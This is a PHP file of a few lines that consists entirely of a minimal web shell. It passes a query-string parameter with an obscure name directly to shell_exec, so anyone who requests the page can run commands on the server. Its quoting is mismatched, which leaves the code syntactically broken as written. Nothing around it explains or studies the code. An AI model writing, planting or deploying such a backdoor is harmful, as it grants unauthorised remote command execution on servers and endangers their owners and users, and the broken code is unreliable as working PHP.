<?php
shell_exec($_GET["chwL1N9t']);
?>
